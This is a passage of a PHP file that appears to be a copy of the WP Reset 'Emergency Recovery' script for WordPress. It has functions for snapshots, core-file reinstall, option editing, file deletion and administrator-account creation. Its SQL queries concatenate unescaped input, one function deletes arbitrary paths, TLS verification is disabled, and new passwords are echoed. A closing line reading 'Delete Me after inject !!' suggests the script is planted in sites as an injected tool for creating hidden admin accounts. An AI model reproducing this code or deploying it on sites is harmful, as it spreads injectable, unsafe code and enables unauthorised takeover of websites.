                    copy($source . '/' . $file, $destination . '/' . $file);
                }
            }
        }
        closedir($dir);
    } // copy_folder

    function get_snapshots()
    {
        $snapshots = $this->get_option('wp-reset-snapshots');
        if (false === $snapshots) {
            return false;
        }

        $snapshots = unserialize($snapshots);
        if (empty($snapshots)) {
            return false;
        }

        return $snapshots;
    }

    function verify_snapshot_integrity($uid)
    {
        $tbl_core = $tbl_custom = 0;
        $snapshots = $this->get_snapshots();

        if (strlen($uid) != 4 && strlen($uid) != 6) {
            return 'Invalid snapshot ID format.';
        }

        if (!isset($snapshots[$uid])) {
            return 'Unknown snapshot ID.';
        }

        $snapshot = $snapshots[$uid];

        if (!empty($snapshot['plugins']) || !empty($snapshot['themes'])) {
            $res = $this->verify_zip_integrity($snapshot);
            if ($res !== true) {
                return $res;
            }
        }

        $table_status = $this->wfdb_get_results('SHOW TABLE STATUS');
        if (is_array($table_status)) {
            foreach ($table_status as $table) {
                if (0 !== stripos($table['Name'], $uid . '_')) {
                    continue;
                }
                if (empty($table['Engine'])) {
                    continue;
                }

                if (in_array(str_replace($uid . '_' . $this->table_prefix, '', $table['Name']), $this->core_tables)) {
                    $tbl_core++;
                } else {
                    $tbl_custom++;
                }
            } // foreach

            if ($tbl_core != $snapshot['tbl_core'] || $tbl_custom != $snapshot['tbl_custom']) {
                return 'Snapshot data has been compromised. Saved metadata does not match data in the DB (Core tables: ' . $tbl_core . ' restored / ' . $snapshot['tbl_core'] . ' in snapshot, Custom tables: ' . $tbl_custom . ' restored / ' . $snapshot['tbl_custom'] . ' in snapshot). Contact WP Reset support if data is critical, or restore it manualy via SQL.';
            }
        } else {
            return 'Can\'t get table status data.';
        }

        return true;
    } // verify_snapshot_integrity


    function verify_zip_integrity($snapshot)
    {
        if (!array_key_exists('file_size', $snapshot) || $snapshot['file_size'] != filesize($this->autosnapshots_dir_path('wp-reset-snapshot-files-' . $snapshot['uid'] . '.zip'))) {
            return 'ZIP file size is not correct!';
        }

        $folders = array();
        if (!empty($snapshot['plugins'])) {
            foreach ($snapshot['plugins'] as $plugin) {
                $folders[] = basename($plugin);
            }
        }

        if (!empty($snapshot['themes'])) {
            foreach ($snapshot['themes'] as $theme) {
                $folders[] = basename($theme);
            }
        }
        sort($folders);

        $zip_folders = array();
        $za = new ZipArchive();
        $za->open($this->autosnapshots_dir_path('wp-reset-snapshot-files-' . $snapshot['uid'] . '.zip'));
        for ($i = 0; $i < $za->numFiles; $i++) {
            $file_path = $za->statIndex($i);
            $file_path_parts = explode('/', $file_path['name']);
            if (!in_array($file_path_parts[0], $zip_folders)) {
                $zip_folders[] = $file_path_parts[0];
            }
        }
        sort($zip_folders);

        if ($folders === $zip_folders) {
            return true;
        } else {
            return 'Snapshot ZIP files have failed integrity validation!';
        }
    } // verify_zip_integrity


    function autosnapshots_dir_path($file = false, $url = false)
    {
        if ($url) {
            $path = WPR_WPCONTENT . '/' . $this->autosnapshots_folder;
        } else {
            $path = $this->trailingslashit(WPR_WPCONTENT) . $this->autosnapshots_folder;
        }

        if ($url === false && !file_exists($path)) {
            $folder = $this->wp_mkdir_p($path);
            if (!$folder) {
                return array('error' => 'Unable to create ' . $path . ' folder.');
            }
        }

        if (!empty($file)) {
            $path = $path . '/' . $file;
        }

        return $path;
    }

    function wp_mkdir_p($target)
    {
        $wrapper = null;

        // Strip the protocol.
        if ($this->wp_is_stream($target)) {
            list($wrapper, $target) = explode('://', $target, 2);
        }

        // From php.net/mkdir user contributed notes.
        $target = str_replace('//', '/', $target);

        // Put the wrapper back on the target.
        if (null !== $wrapper) {
            $target = $wrapper . '://' . $target;
        }

        /*
         * Safe mode fails with a trailing slash under certain PHP versions.
         * Use rtrim() instead of untrailingslashit to avoid formatting.php dependency.
         */
        $target = rtrim($target, '/');
        if (empty($target)) {
            $target = '/';
        }

        if (file_exists($target)) {
            return @is_dir($target);
        }

        // Do not allow path traversals.
        if (false !== strpos($target, '../') || false !== strpos($target, '..' . DIRECTORY_SEPARATOR)) {
            return false;
        }

        // We need to find the permissions of the parent folder that exists and inherit that.
        $target_parent = dirname($target);
        while ('.' !== $target_parent && !is_dir($target_parent) && dirname($target_parent) !== $target_parent) {
            $target_parent = dirname($target_parent);
        }

        // Get the permission bits.
        $stat = @stat($target_parent);
        if ($stat) {
            $dir_perms = $stat['mode'] & 0007777;
        } else {
            $dir_perms = 0777;
        }

        if (@mkdir($target, $dir_perms, true)) {

            /*
             * If a umask is set that modifies $dir_perms, we'll have to re-set
             * the $dir_perms correctly with chmod()
             */
            if (($dir_perms & ~umask()) != $dir_perms) {
                $folder_parts = explode('/', substr($target, strlen($target_parent) + 1));
                for ($i = 1, $c = count($folder_parts); $i <= $c; $i++) {
                    chmod($target_parent . '/' . implode('/', array_slice($folder_parts, 0, $i)), $dir_perms);
                }
            }

            return true;
        }

        return false;
    }

    function export_dir_path($file = false, $url = false)
    {
        if ($url) {
            $path = WPR_WPCONTENT . '/' . $this->snapshots_folder;
        } else {
            $path = $this->trailingslashit(WPR_WPCONTENT) . $this->snapshots_folder;
        }

        if ($url === false && !file_exists($path)) {
            $folder = $this->wp_mkdir_p($path);
            if (!$folder) {
                return array('error' => 'Unable to create ' . $path . ' folder.');
            }
        }

        if (!empty($file)) {
            $path = $path . '/' . $file;
        }

        return $path;
    } // export_dir_path

    function reset_user_prefix()
    {
        $search_options = $this->wfdb_get_results('SELECT * FROM ' . $this->table_prefix . 'options WHERE option_name LIKE "%user_roles"');
        if (!$search_options) {
            $this->wpr_error('Could not fix! No user_roles option found in ' . $this->table_prefix . ' options');
        } else if (count($search_options) > 1) {
            $this->wpr_error('Could not fix! Multiple user_roles options found in ' . $this->table_prefix . ' options');
        } else {
            $this->wfdb->query('UPDATE ' . $this->table_prefix . 'options SET option_name = "' . $this->table_prefix . 'user_roles" WHERE option_id = ' . $search_options[0]['option_id']);

            $user_meta_names = array('capabilities', 'user_level', 'dashboard_quick_press_last_post_id', 'user-settings', 'user-settings-time');
            foreach ($user_meta_names as $user_meta_name) {
                $search_usermeta = $this->wfdb_get_results('SELECT * FROM ' . $this->table_prefix . 'usermeta WHERE meta_key LIKE "%' . $user_meta_name . '"');
                if ($search_usermeta) {
                    foreach ($search_usermeta as $existing_usermeta) {
                        $this->wfdb->query('UPDATE ' . $this->table_prefix . 'usermeta SET meta_key = "' . $this->table_prefix . $user_meta_name . '" WHERE umeta_id = ' . $existing_usermeta['umeta_id']);
                    }
                }
            }
            $this->reload('Users\' database prefix and roles reset successfully!');
        }
    }

    function create_admin_user($user, $pass)
    {
        if (strlen($user) < 4 || strlen($pass) < 4) {
            $this->wpr_error('Invalid username or password!');
            return false;
        }

        $search_users = $this->wfdb_get_row('SELECT * FROM ' . $this->table_prefix . 'users WHERE user_login = "' . $user . '"');
        if ($search_users !== false) {
            $this->wpr_error('User ' . $user . ' already exists!');
        } else {
            include ABSPATH . 'wp-includes/class-phpass.php';
            $wp_hasher = new PasswordHash(8, true);
            $hash_password = $wp_hasher->HashPassword(trim($pass));

            $insert_user = $this->wfdb->prepare('INSERT INTO ' . $this->table_prefix . 'users(user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES(?,?,?,?,?,?,?)');
            if (false === $insert_user) {
                $this->wpr_error('prepare() failed: ' . htmlspecialchars($this->wfdb->error));
                die();
            }
            $insert_user->bind_param('sssssss', $user_login, $user_pass, $user_nicename, $user_email, $user_registered, $user_status, $display_name);

            $user_login = $user;
            $user_pass = $hash_password;
            $user_nicename = $user;
            $user_email = $_REQUEST['admin_email'];
            $user_registered = date('Y-m-d H:i:s');
            $user_status = 0;
            $display_name = $user;

            // Execute prepared statement
            if ($insert_user->execute()) {
                if ($this->wfdb->insert_id > 0) {
                    $new_user_id = $this->wfdb->insert_id;

                    $insert_role = $this->wfdb->query('INSERT INTO ' . $this->table_prefix . 'usermeta(user_id,meta_key,meta_value) VALUES("' . $new_user_id . '","' . $this->table_prefix . 'capabilities","a:1:{s:13:\"administrator\";s:1:\"1\";}")');
                    $insert_user_level = $this->wfdb->query('INSERT INTO ' . $this->table_prefix . 'usermeta(user_id,meta_key,meta_value) VALUES("' . $new_user_id . '","' . $this->table_prefix . 'user_level","10")');

                    if ($insert_role && $insert_user_level) {
                        $this->reload('User <strong>' . $user . '</strong> with pass <strong>' . $pass . '</strong> created');
                    } else {
                        $this->wpr_error('An error occurred creating the new user account!');
                    }
                }
            } else {
                $this->wpr_error('An error occurred creating the new user account: ' . $insert_user->error);
            }
            $insert_user->close();
        }
    }

    function delete_file($file)
    {
        if (file_exists(ABSPATH . urldecode($file))) {
            unlink(ABSPATH . urldecode($file));
            $this->reload(urldecode($file) . ' deleted');
        } else {
            $this->reload(urldecode($file) . ' not found');
        }
    }

    function reinstall_core_files()
    {
        $wp_zip = 'https://downloads.wordpress.org/release/' . $this->locale . 'wordpress-' . $this->wp_version . '.zip';
        $local_zip = 'wpr-wp-' . $this->wp_version . '.zip';
        $ch_local_zip = fopen($local_zip, "w");
        $ch_start = curl_init();
        curl_setopt($ch_start, CURLOPT_URL, $wp_zip);
        curl_setopt($ch_start, CURLOPT_FAILONERROR, true);
        curl_setopt($ch_start, CURLOPT_HEADER, 0);
        curl_setopt($ch_start, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch_start, CURLOPT_AUTOREFERER, true);
        curl_setopt($ch_start, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch_start, CURLOPT_TIMEOUT, 360);
        curl_setopt($ch_start, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch_start, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch_start, CURLOPT_FILE, $ch_local_zip);
        $get_zip = curl_exec($ch_start);
        if (!$get_zip) {
            $this->wpr_error("Error :- " . curl_error($ch_start));
        }
        curl_close($ch_start);

        $zip = new ZipArchive;

        if ($zip->open($local_zip) != "true") {
            $this->wpr_error("Error: Unable to open the Zip File<br/>");
        }

        $zip->extractTo(ABSPATH . 'wpr_wp_temp');
        $zip->close();
        $this->recursive_copy(ABSPATH . 'wpr_wp_temp/wordpress', ABSPATH);
        $this->delete_directory(ABSPATH . 'wpr_wp_temp');
        unlink($local_zip);
        $this->reload('Core files reinstalled', 'scan_core_files');
    }


    /**
     Utility Functions
     */

    function wpr_error($error)
    {
        echo '<div class="error">' . $error . '</div>';
    }

    function delete_directory($dir)
    {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            (is_dir("$dir/$file")) ? $this->delete_directory("$dir/$file") : unlink("$dir/$file");
        }
        return rmdir($dir);
    }

    function wfdb_get_results($query)
    {
        $records = $this->wfdb->query($query);

        if ($records === false) {
            return false;
        }

        $results = array();
        while ($row = $records->fetch_assoc()) {
            $results[] = $row;
        }
        if (empty($results)) {
            return false;
        }
        return $results;
    }

    function wfdb_get_col($query)
    {
        $records = $this->wfdb->query($query);

        if ($records === false) {
            return false;
        }

        $results = array();
        while ($row = $records->fetch_assoc()) {
            error_log(array_values($row)[0]);
            $results[] = array_values($row)[0];
        }
        if (empty($results)) {
            return false;
        }
        return $results;
    }

    function wfdb_get_row($query)
    {
        $records = $this->wfdb->query($query);

        if ($records === false) {
            return false;
        }

        while ($row = $records->fetch_assoc()) {
            return $row;
        }
        return false;
    }

    function wfdb_get_var($query)
    {
        $records = $this->wfdb->query($query);

        if ($records === false) {
            return false;
        }

        while ($row = $records->fetch_assoc()) {
            return reset($row);
        }
        return false;
    }

    function get_define_value($constant)
    {
        preg_match_all('/define\(\s*[\'|"]\s*(' . $constant . ')\s*[\'|"]\s*,\s*(false|true|[\'|"].*[\'|"])\s*\);/i', $this->wp_config, $matches);

        if (count($matches[2]) > 0) {
            return trim(trim($matches[2][0], '\''), '"');
        } else {
            return false;
        }
    }

    function get_variable($variable, $file_contents)
    {
        preg_match_all('/(\$' . $variable . ')\s*=\s*(.*?);/i', $file_contents, $matches);

        if (count($matches[2]) > 0) {
            return trim(trim($matches[2][0], '\''), '"');
        } else {
            return false;
        }
    }

    function get_option($option_name)
    {
        return $this->wfdb_get_var('SELECT option_value FROM ' . $this->table_prefix . 'options WHERE option_name="' . $option_name . '"');
    }

    function update_option($option_name, $option_value)
    {
        if (is_array($option_value)) {
            $option_value = serialize($option_value);
        }

        $update_option = $this->wfdb->prepare('UPDATE ' . $this->table_prefix . 'options SET option_value=? WHERE option_name=? LIMIT 1');
        if (false === $update_option) {
            $this->wpr_error('prepare() failed: ' . htmlspecialchars($this->wfdb->error));
            die();
        }
        $update_option->bind_param('ss', $update_option_value, $update_option_name);

        $update_option_name = $option_name;
        $update_option_value = $option_value;

        // Execute prepared statement
        if ($update_option->execute()) {
            $update_option->close();
            return true;
        } else {
            $this->wpr_error('An error occurred while saving data! ' . $update_option->error);
            $update_option->close();
        }
    }

    function delete_option($option_id)
    {
        return $this->wfdb->query('DELETE FROM ' . $this->table_prefix . 'options WHERE option_id="' . $option_id . '" LIMIT 1');
    }

    function update_option_row($option_id, $update, $value)
    {
        $update_option = $this->wfdb->prepare('UPDATE ' . $this->table_prefix . 'options SET option_' . $update . '=? WHERE option_id=?');
        if (false === $update_option) {
            $this->wpr_error('prepare() failed: ' . htmlspecialchars($this->wfdb->error));
            die();
        }
        $update_option->bind_param('sd', $update_option_value, $update_option_id);

        $update_option_id = $option_id;
        $update_option_value = $value;

        // Execute prepared statement
        if ($update_option->execute()) {
            $update_option->close();
            return true;
        } else {
            $this->wpr_error('An error occured while saving data! ' . $update_option->error);
            $update_option->close();
        }
    }

    function add_option($option_name, $option_value)
    {
        $insert_option = $this->wfdb->prepare('INSERT INTO ' . $this->table_prefix . 'options(option_name, option_value) VALUES(?,?)');
        if (false === $insert_option) {
            $this->wpr_error('prepare() failed: ' . htmlspecialchars($this->wfdb->error));
            die();
        }
        $insert_option->bind_param('ss', $add_option_name, $add_option_value);

        $add_option_name = $option_name;
        $add_option_value = $option_value;

        // Execute prepared statement
        if ($insert_option->execute()) {
            $insert_option->close();
            return true;
        } else {
            $this->wpr_error('An error occured while adding the new option! ' . $insert_option->error);
            $insert_option->close();
            return false;
        }
    }

    function reload($message, $action = false)
    {
        $url = strtok('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
        header('Location: ' . $url . '?message=' . urlencode($message) . ($action != false ? '&action=' . $action : ''));
    }

    function get_theme_headers($file)
    {
        $fp = fopen($file, 'r');
        $file_data = fread($fp, 8192);

        fclose($fp);

        // Make sure we catch CR-only line endings.
        $file_data = str_replace("\r", "\n", $file_data);

        $all_headers = array(
            'Name'        => 'Theme Name',
            'ThemeURI'    => 'Theme URI',
            'Description' => 'Description',
            'Author'      => 'Author',
            'AuthorURI'   => 'Author URI',
            'Version'     => 'Version',
            'Template'    => 'Template',
            'Status'      => 'Status',
            'Tags'        => 'Tags',
            'TextDomain'  => 'Text Domain',
            'DomainPath'  => 'Domain Path',
        );

        foreach ($all_headers as $field => $regex) {
            if (preg_match('/^[ \t\/*#@]*' . preg_quote($regex, '/') . ':(.*)$/mi', $file_data, $match) && $match[1]) {
                $all_headers[$field] = $this->cleanup_header_comment($match[1]);
            } else {
                $all_headers[$field] = '';
            }
        }

        return $all_headers;
    }

    function get_plugins($plugin_root = '')
    {

        $plugins_dir  = @opendir($plugin_root);
        $plugin_files = array();
        if ($plugins_dir) {
            while (($file = readdir($plugins_dir)) !== false) {
                if (substr($file, 0, 1) == '.') {
                    continue;
                }
                if (is_dir($plugin_root . '/' . $file)) {
                    $plugins_subdir = @opendir($plugin_root . '/' . $file);
                    if ($plugins_subdir) {
                        while (($subfile = readdir($plugins_subdir)) !== false) {
                            if (substr($subfile, 0, 1) == '.') {
                                continue;
                            }
                            if (substr($subfile, -4) == '.php') {
                                $plugin_files[] = "$file/$subfile";
                            }
                        }
                        closedir($plugins_subdir);
                    }
                } else {
                    if (substr($file, -4) == '.php') {
                        $plugin_files[] = $file;
                    }
                }
            }
            closedir($plugins_dir);
        }

        if (empty($plugin_files)) {
            return false;
        }

        foreach ($plugin_files as $plugin_file) {
            if (!is_readable("$plugin_root/$plugin_file")) {
                continue;
            }

            $plugin_data = $this->get_plugin_data("$plugin_root/$plugin_file", false, false); //Do not apply markup/translate as it'll be cached.

            if (empty($plugin_data['Name'])) {
                continue;
            }

            $wp_plugins[$this->plugin_basename($plugin_file)] = $plugin_data;
        }

        return $wp_plugins;
    }

    function get_plugin_data($plugin_file, $markup = true, $translate = true)
    {

        $default_headers = array(
            'Name'        => 'Plugin Name',
            'PluginURI'   => 'Plugin URI',
            'Version'     => 'Version',
            'Description' => 'Description',
            'Author'      => 'Author',
            'AuthorURI'   => 'Author URI',
            'TextDomain'  => 'Text Domain',
            'DomainPath'  => 'Domain Path',
            'Network'     => 'Network',
            // Site Wide Only is deprecated in favor of Network.
            '_sitewide'   => 'Site Wide Only',
        );

        $plugin_data = $this->get_file_data($plugin_file, $default_headers, 'plugin');

        // Site Wide Only is the old header for Network
        if (!$plugin_data['Network'] && $plugin_data['_sitewide']) {
            /* translators: 1: Site Wide Only: true, 2: Network: true */
            $plugin_data['Network'] = $plugin_data['_sitewide'];
        }
        $plugin_data['Network'] = ('true' == strtolower($plugin_data['Network']));
        unset($plugin_data['_sitewide']);

        // If no text domain is defined fall back to the plugin slug.
        if (!$plugin_data['TextDomain']) {
            $plugin_slug = dirname($this->plugin_basename($plugin_file));
            if ('.' !== $plugin_slug && false === strpos($plugin_slug, '/')) {
                $plugin_data['TextDomain'] = $plugin_slug;
            }
        }

        $plugin_data['Title']      = $plugin_data['Name'];
        $plugin_data['AuthorName'] = $plugin_data['Author'];

        return $plugin_data;
    }

    function get_file_data($file, $default_headers, $context = '')
    {
        $fp = fopen($file, 'r');

        $file_data = fread($fp, 8192);

        fclose($fp);

        $file_data = str_replace("\r", "\n", $file_data);

        $all_headers = $default_headers;

        foreach ($all_headers as $field => $regex) {
            if (preg_match('/^[ \t\/*#@]*' . preg_quote($regex, '/') . ':(.*)$/mi', $file_data, $match) && $match[1]) {
                $all_headers[$field] = $this->cleanup_header_comment($match[1]);
            } else {
                $all_headers[$field] = '';
            }
        }

        return $all_headers;
    }

    function cleanup_header_comment($str)
    {
        return trim(preg_replace('/\s*(?:\*\/|\?>).*/', '', $str));
    }

    function plugin_basename($file)
    {

        $plugin_dir    = $this->wp_normalize_path(WPR_PLUGINDIR);
        //$mu_plugin_dir = wp_normalize_path( WPMU_PLUGIN_DIR );

        $file = preg_replace('#^' . preg_quote($plugin_dir, '#') . '/|^' . '/#', '', $file); // get relative path from plugins dir
        $file = trim($file, '/');
        return $file;
    }

    function wp_normalize_path($path)
    {
        $wrapper = '';
        if ($this->wp_is_stream($path)) {
            list($wrapper, $path) = explode('://', $path, 2);
            $wrapper               .= '://';
        }

        // Standardise all paths to use /
        $path = str_replace('\\', '/', $path);

        // Replace multiple slashes down to a singular, allowing for network shares having two slashes.
        $path = preg_replace('|(?<=.)/+|', '/', $path);

        // Windows paths should uppercase the drive letter
        if (':' === substr($path, 1, 1)) {
            $path = ucfirst($path);
        }

        return $wrapper . $path;
    }

    function wp_is_stream($path)
    {
        $scheme_separator = strpos($path, '://');

        if (false === $scheme_separator) {
            // $path isn't a stream
            return false;
        }

        $stream = substr($path, 0, $scheme_separator);

        return in_array($stream, stream_get_wrappers(), true);
    }

    function get_file_hashes()
    {
        $locale = 'en_US';
        $checkurl = 'https://api.wordpress.org/core/checksums/1.0/?version=' . $this->wp_version . '&locale=' . $locale;
        $response = file_get_contents($checkurl);
        $hashes = json_decode($response, true);

        if (!empty($hashes) && is_array($hashes['checksums'])) {
            $cleaned = array();

            $themes_path = 'wp-content/themes/';
            $plugins_path = 'wp-content/plugins/';

            foreach ($hashes['checksums'] as $path => $hash) {
                if (
                    strpos($path, $themes_path) !== false
                    || strpos($path, $plugins_path) !== false
                    || strpos($path, '/plugins/akismet/') !== false
                    || strpos($path, '/languages/themes/') !== false
                ) {
                } else {
                    $cleaned[$path] = $hash;
                }
            }

            return $cleaned;
        }
        return false;
    } // get_file_hashes

    function scan_folder($path, $extensions = null, $depth = 3, $relative_path = '')
    {
        if (!is_dir($path))
            return false;

        if ($extensions) {
            $extensions = (array) $extensions;
            $_extensions = implode('|', $extensions);
        } else {
            //$extensions = array('php', 'php3', 'inc' );
            $extensions = array(); // empty array to find all types of files.
            $_extensions = implode('|', $extensions);
        }

        $relative_path = $this->trailingslashit($relative_path);
        if ('/' == $relative_path) {
            $relative_path = '';
        }

        $results = scandir($path);
        $files = array();

        foreach ($results as $result) {

            if ('.' == $result[0]) {
                continue;
            }

            if (is_dir($path . '/' . $result)) {
                if (!$depth || 'CVS' == $result) {
                    continue;
                }
                $found = $this->scan_folder($path . '/' . $result, $extensions, $depth - 1, $relative_path . $result);
                $files = array_merge_recursive($files, $found);
            } elseif (!$extensions || preg_match('~\.(' . $_extensions . ')$~', $result)) {
                $files[$relative_path . $result] = $path . '/' . $result;
            }
        } // foreach result

        return $files;
    } // scan_folder

    function recursive_copy($src, $dst)
    {
        $dir = opendir($src);
        @mkdir($dst);
        while (false !== ($file = readdir($dir))) {
            if (($file != '.') && ($file != '..')) {
                if (is_dir($src . '/' . $file)) {
                    $this->recursive_copy($src . '/' . $file, $dst . '/' . $file);
                } else {
                    copy($src . '/' . $file, $dst . '/' . $file);
                }
            }
        }
        closedir($dir);
    }

    function trailingslashit($string)
    {
        return $this->untrailingslashit($string) . '/';
    }

    function untrailingslashit($string)
    {
        return rtrim($string, '/\\');
    }

    function get_db_info($host)
    {
        if (strpos($host, ':') > 0) {
            $db_host_parts = parse_url($host);
            return array('host' => $db_host_parts['host'], 'port' => $db_host_parts['port']);
        } else {
            return array('host' => $host, 'port' => 3306);
        }
    }

    function scan_files($return = true)
    {
        $results['missing_ok'] =  $results['missing_bad'] = array();
        $results['changed_ok'] = $results['changed_bad'] = array();
        $results['unknown_bad'] = array();
        $results['ok'] = array();
        $results['last_run'] = time();
        $results['total'] = $results['run_time'] = 0;
        $start_time = microtime(true);


        // Files ok to be missing
        $missing_ok = array('index.php', 'readme.html', 'license.txt', 'wp-config-sample.php', 'wp-admin/install.php', 'wp-admin/upgrade.php', 'wp-config.php', 'plugins/hello.php', 'licens.html', '/languages/plugins/akismet-');

        // Files ok to be modified
        $changed_ok = array('index.php', 'wp-config.php', 'wp-config-sample.php', 'readme.html', 'license.txt');

        $filehashes = $this->get_file_hashes();

        if ($filehashes) {

            // ** Checking for unknown files
            $files = $this->scan_folder(ABSPATH . 'wp-includes', null, 9, 'wp-includes');
            $all_files = $files;

            $files = $this->scan_folder(ABSPATH . 'wp-admin', null, 9, 'wp-admin');
            $all_files = array_merge($all_files, $files);

            foreach ($all_files as $key => $af) {
                if (!isset($filehashes[$key])) {
                    $results['unknown_bad'][] = $key;
                }
            }

            // Checking if core has been modified
            $results['total'] = sizeof($filehashes); // ['checksums']

            foreach ($filehashes as $file => $hash) {
                clearstatcache();

                if (file_exists(ABSPATH . $file)) {
                    if ($hash == md5_file(ABSPATH . $file)) {
                        // $results['ok'][] = $file; // FYLDER FOR MEGET i databasen og kan ikke loade i scheduled scanner results
                    } elseif (in_array($file, $changed_ok)) {
                        $results['changed_ok'][] = $file;
                    } else {
                        $results['changed_bad'][] = $file;
                    }
                } else {
                    // if ( self::stripos_array( $file, $missing_ok ) ) {
                    if (in_array($file, $missing_ok)) {
                        $results['missing_ok'][] = $file;
                    } else {
                        $results['missing_bad'][] = $file;
                    }
                }
            } // foreach file

            $results['run_time'] = microtime(true) - $start_time;

            if ($return) {
                return $results;
            }
        }

        return false;
    } // scan_files

    function format_size($bytes)
    {
        if ($bytes > 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes > 1048576) {
            return number_format($bytes / 1048576, 1) . ' MB';
        } elseif ($bytes > 1024) {
            return number_format($bytes / 1024, 1) . ' KB';
        } else {
            return number_format($bytes, 0) . ' bytes';
        }
    } // format_size

    function get_current_url(){
        $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . '://' . $_SERVER['HTTP_HOST'];
        $uri_parts = explode('?', $_SERVER['REQUEST_URI'], 2);
        return $url . $uri_parts[0];
    }
} // WPR_Emergency_Recovery

// Since we do everything in constructor and we don't need to access it from outside...
new WPR_Emergency_Recovery();

echo "<a href='?killme'>Delete Me after inject !!</a>";